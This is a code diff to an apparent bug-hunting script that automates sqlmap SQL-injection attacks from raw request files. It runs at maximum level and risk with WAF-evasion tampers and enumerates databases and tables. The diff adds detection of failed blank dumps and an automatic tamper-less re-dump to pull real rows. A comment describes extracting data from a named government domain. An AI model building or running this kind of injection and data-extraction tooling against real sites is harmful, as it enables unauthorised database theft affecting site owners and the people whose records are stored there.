@@ -6396,10 +6396,55 @@ def _sqli_rce_hints(conf: dict, req_abs: str, target_url: str) -> str:
     return "\n".join(lines)
 
 
+def _sqlmap_dump_looks_blank(out: str) -> bool:
+    """True only when a sqlmap --dump's extraction FAILED (tampers corrupting the
+    heavier data payloads): EVERY data row is (almost) all ``<blank>`` AND a
+    retrieval-error marker is present.
+
+    Decided at TABLE level with the column-header row skipped, so:
+      • a dump with ANY real data row is NOT flagged (don't discard real PoC rows),
+      • a PK-only row (``| 1 | <blank> | <blank> |``) still counts as failed
+        (>=80% blank), and
+      • a genuine empty-string row — which sqlmap also renders ``<blank>`` — does
+        NOT trigger a needless re-scan, because a corroborating HTTP-500 /
+        "unable to retrieve" marker is required."""
+    if not out or "<blank>" not in out:
+        return False
+    low = out.lower()
+    if "internal server error" not in low and "unable to retrieve" not in low:
+        return False  # blank cells with no retrieval error = real empty-string data
+    data_rows = failed_rows = 0
+    seps = 0
+    for ln in out.splitlines():
+        s = ln.strip()
+        if s.startswith(("Table:", "Database:")):
+            seps = 0
+            continue
+        if s.startswith("+") and s.endswith("+") and set(s) <= set("+-"):
+            seps += 1
+            continue
+        if not (s.startswith("|") and s.endswith("|")):
+            continue
+        if seps < 2:                      # first grid row (seps==1) is the header
+            continue
+        cells = [c.strip() for c in s.strip("|").split("|")]
+        if not any(cells):
+            continue
+        data_rows += 1
+        blanks = sum(1 for c in cells if c == "<blank>")
+        non_blank = len(cells) - blanks
+        # Failed = at most the PK survived (<=1 real cell), or >=80% blank (wide row
+        # where only a couple cells leaked). Both gated by the error marker above.
+        if non_blank <= 1 or blanks >= 0.8 * len(cells):
+            failed_rows += 1
+    return data_rows > 0 and failed_rows == data_rows
+
+
 # ── NEW: sqlmap via raw request file (--request-file) ───────────────────────────
 def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                              level: int = 5, risk: int = 3,
-                             extra_flags: str = "") -> bool:
+                             extra_flags: str = "",
+                             tamper: str = "space2comment,between") -> bool:
     """
     Run sqlmap against a raw Burp-style HTTP request file.
     Usage: hunt.py --request-file req.txt [--target domain]
@@ -6465,20 +6510,21 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
 
     # ── Build sqlmap command ─────────────────────────────────────────────────
     # -r  : read from raw request file (handles method, headers, body)
-    # --batch: non-interactive
-    # --level 5 / --risk 3: maximum coverage
-    # --dbs: enumerate databases on injection
-    # --random-agent: rotate UA
-    # --tamper=space2comment: basic WAF evasion
-    cmd = (
-        f'sqlmap -r "{req_abs}" '
-        f'--batch --level={level} --risk={risk} '
-        f'--dbs --tables --random-agent '
-        f'--tamper=space2comment,between '
-        f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
-        f'--timeout=15 --retries=2 '
-        f'{extra_flags}'
-    )
+    # --batch: non-interactive  |  --level 5 / --risk 3: maximum coverage
+    # --dbs --tables: enumerate on injection  |  --random-agent: rotate UA
+    # --tamper: WAF-evasion (configurable via `tamper`; "" disables — see retry below)
+    def _build(tamper_clause: str, extra: str = "") -> str:
+        return (
+            f'sqlmap -r "{req_abs}" '
+            f'--batch --level={level} --risk={risk} '
+            f'--dbs --tables --random-agent {tamper_clause}'
+            f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
+            f'--timeout=15 --retries=2 '
+            f'{extra_flags} {extra}'
+        ).strip()
+
+    tamper_clause = f'--tamper={tamper} ' if tamper else ''
+    cmd = _build(tamper_clause)
 
     log("info", f"Running: {cmd}")
     # pty_stdin=True is REQUIRED here: sqlmap's `-r` (request-file) mode silently
@@ -6489,6 +6535,31 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     ok, out = run_cmd(cmd, timeout=2400, watch_file=sqli_dir, watch_phase="SQLMAP-RF",
                       pty_stdin=True)
     print(out[-4000:] if len(out) > 4000 else out)
+
+    # ── Auto-retry a BLANK dump WITHOUT tampers ──────────────────────────────
+    # space2comment/between are great for getting injection *detected* through a
+    # WAF, but they can mangle the heavier data-EXTRACTION payloads — observed on
+    # ttdtcp.ap.gov.in: 488 HTTP 500s and every dumped cell `<blank>`, while a
+    # tamper-less re-dump returned real rows instantly. So when the operator asked
+    # for a dump and it came back all-`<blank>`, re-fetch fresh and tamper-less so
+    # request-file mode produces actual PoC data, not just a detection.
+    dump_requested = "--dump" in (extra_flags or "")
+    if dump_requested and tamper and _sqlmap_dump_looks_blank(out):
+        log("warn", "Dump returned all-<blank> with tampers active — retrying WITHOUT "
+                    "tampers (--fresh-queries); tampers can corrupt data extraction")
+        cmd2 = _build('', '--fresh-queries')
+        log("info", f"Running: {cmd2}")
+        ok2, out2 = run_cmd(cmd2, timeout=2400, watch_file=sqli_dir,
+                            watch_phase="SQLMAP-RF-NOTAMPER", pty_stdin=True)
+        print(out2[-4000:] if len(out2) > 4000 else out2)
+        # Adopt the retry ONLY if it actually produced data. If it's ALSO blank
+        # (flaky WAF / injection that only fired with the tamper), keep run 1 so a
+        # worse retry never silently discards real rows. (run 1 was all-blank to get
+        # here, so adopting a non-blank run 2 is strictly an improvement.)
+        if not _sqlmap_dump_looks_blank(out2):
+            ok, out = ok2, out2
+        else:
+            log("warn", "Tamper-less retry also returned blank — keeping original output")
 
     # ── Parse results: robust CONFIRMED-injection detection ──────────────────
     conf = _parse_sqlmap_confirmation(out)
@@ -7836,6 +7907,11 @@ Examples:
                         help="sqlmap --risk for --request-file mode (default 3)")
     parser.add_argument("--sqlmap-extra",     type=str, default="",
                         help="Extra sqlmap flags (e.g. '--dbms=mysql --technique=BT')")
+    parser.add_argument("--sqlmap-tamper",    type=str, default="space2comment,between",
+                        help="sqlmap --tamper for --request-file mode; pass '' to disable. "
+                             "Tampers help WAF-evasion DETECTION but can corrupt data "
+                             "EXTRACTION — a blank --dump auto-retries tamper-less. "
+                             "(default: space2comment,between)")
 
     args = parser.parse_args()
     resume_requested = args.resume is not None
@@ -7990,6 +8066,7 @@ Examples:
             level=args.sqlmap_level,
             risk=args.sqlmap_risk,
             extra_flags=args.sqlmap_extra,
+            tamper=args.sqlmap_tamper,
         )
         sys.exit(0 if found else 1)
 
